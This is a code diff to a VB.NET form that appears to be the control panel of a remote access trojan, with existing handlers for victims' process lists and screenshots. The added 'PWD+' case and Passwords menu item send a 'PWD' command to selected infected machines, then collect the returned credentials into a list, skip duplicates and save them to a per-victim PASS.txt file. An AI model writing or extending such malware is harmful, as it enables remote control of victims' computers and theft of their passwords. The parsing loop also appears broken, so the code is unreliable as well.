@@ -130,7 +130,7 @@ Public Class Form1
                     D.Show()
                 End If
 
-                D.ListView1.Clear()
+                D.ListView1.Items.Clear()
 
                 D.ListView1.Columns.Add("")
                 D.ListView1.Columns.Add("")
@@ -150,7 +150,7 @@ Public Class Form1
 
             Case "Processes"
                 Dim D As Details = My.Application.OpenForms("Details" & C.ip)
-
+                D.ListView2.Items.Clear()
                 For i As Integer = 1 To A.Length - 1
                     Dim x As String() = Split(A(i), "|LIME|")
                     D.ListView2.Items.Add(x(0)).SubItems.Add(x(1))
@@ -174,6 +174,46 @@ Public Class Form1
                 IO.File.WriteAllBytes("Users" & "\" & A(1) + "\" & "SC.jpeg", Convert.FromBase64String(A(2)))
                 Process.Start("Users" & "\" & A(1) + "\" & "SC.jpeg")
 
+            Case "PWD+"
+                If F.InvokeRequired Then
+                    F.Invoke(New _DT(AddressOf DT), C, B)
+                    Exit Sub
+                End If
+
+                Dim P As PWD = My.Application.OpenForms("PWD")
+                If P Is Nothing Then
+                    P = PWD
+                    P.Name = "PWD"
+                    P.F = F
+                    P.C = C
+                    P.Show()
+                End If
+
+                'duplicate 
+                For Each listItem As ListViewItem In P.ListView1.Items
+                    If listItem.SubItems.Item(0).Text.Contains(A(3).ToString) Then
+                        Exit Select
+                    End If
+                Next
+
+                'write listview
+                Dim aa As String() = Split(A(1), "~|~")
+                For i = 2 To aa.Length
+                    Dim ii As New ListViewItem
+                    ii.Text = aa(i)
+                    ii.SubItems.Add(aa(i + 2))
+                    ii.SubItems.Add(aa(i + 4))
+                    ii.SubItems.Add(aa(i + 6))
+                    ii.SubItems.Add(aa(i + 8))
+                    P.ListView1.Items.Add(ii)
+                    i += 9
+                Next
+
+                'write disk
+                If Not IO.Directory.Exists("Users" & "\" & A(2)) Then
+                    IO.Directory.CreateDirectory("Users" & "\" & A(2))
+                End If
+                IO.File.WriteAllText("Users" & "\" & A(2) + "\" & "PASS.txt", A(2))
 
 
         End Select
@@ -338,6 +378,12 @@ Public Class Form1
         Next
     End Sub
 
+    Private Sub PasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsToolStripMenuItem.Click
+        For Each l As ListViewItem In Me.L1.SelectedItems
+            Dim C As C = CType(l.Tag, C)
+            C.SendText("PWD")
+        Next
+    End Sub
 
 #End Region
 
@@ -503,6 +549,8 @@ Public Class Form1
         L1.Sort()
         Fix()
     End Sub
+
+
 
 
 
